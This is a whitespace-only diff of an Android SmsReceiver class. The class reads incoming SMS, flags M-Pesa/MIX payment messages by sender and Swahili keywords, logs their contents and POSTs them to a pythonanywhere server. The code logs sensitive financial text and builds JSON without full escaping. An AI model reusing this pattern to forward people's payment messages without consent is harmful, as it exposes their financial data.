@@ -15,11 +15,11 @@ import java.io.InputStreamReader;
 public class SmsReceiver extends BroadcastReceiver {
     private static final String TAG = "SmsReceiver";
     private static final String SERVER_URL = "https://GhostTester.pythonanywhere.com/api/mixx-sms-payment";
-    
+
     @Override
     public void onReceive(Context context, Intent intent) {
         Log.d(TAG, "SMS RECEIVED - STARTING PROCESS");
-        
+
         Bundle bundle = intent.getExtras();
         if (bundle != null) {
             Object[] pdus = (Object[]) bundle.get("pdus");
@@ -28,10 +28,10 @@ public class SmsReceiver extends BroadcastReceiver {
                     SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                     String sender = smsMessage.getDisplayOriginatingAddress();
                     String messageBody = smsMessage.getMessageBody();
-                    
+
                     Log.d(TAG, "SMS From: " + sender);
                     Log.d(TAG, "SMS Body: " + messageBody);
-                    
+
                     if (isMixxPaymentSMS(sender, messageBody)) {
                         Log.d(TAG, "MIXX PAYMENT SMS DETECTED");
                         sendToServer(sender, messageBody);
@@ -40,10 +40,10 @@ public class SmsReceiver extends BroadcastReceiver {
             }
         }
     }
-    
+
     private boolean isMixxPaymentSMS(String sender, String messageBody) {
         String lowerBody = messageBody.toLowerCase();
-        return sender.contains("M-Pesa") || 
+        return sender.contains("M-Pesa") ||
                sender.contains("MIX") ||
                sender.contains("MPESA") ||
                lowerBody.contains("umetuma") ||
@@ -54,7 +54,7 @@ public class SmsReceiver extends BroadcastReceiver {
                lowerBody.contains("muamala") ||
                lowerBody.contains("salio");
     }
-    
+
     private void sendToServer(final String sender, final String messageBody) {
         new Thread(new Runnable() {
             @Override
@@ -66,23 +66,23 @@ public class SmsReceiver extends BroadcastReceiver {
                     conn.setRequestProperty("Content-Type", "application/json");
                     conn.setRequestProperty("Accept", "application/json");
                     conn.setDoOutput(true);
-                    
+
                     String jsonData = "{" +
                             "\"sms_content\": \"" + messageBody.replace("\"", "\\\"").replace("\n", " ") + "\"," +
                             "\"sender_number\": \"" + sender + "\"," +
                             "\"timestamp\": \"" + System.currentTimeMillis() + "\"" +
                             "}";
-                    
+
                     OutputStream os = conn.getOutputStream();
                     os.write(jsonData.getBytes());
                     os.flush();
                     os.close();
-                    
+
                     int responseCode = conn.getResponseCode();
                     Log.d(TAG, "Server Response Code: " + responseCode);
-                    
+
                     conn.disconnect();
-                    
+
                 } catch (Exception e) {
                     Log.e(TAG, "ERROR: " + e.getMessage());
                 }
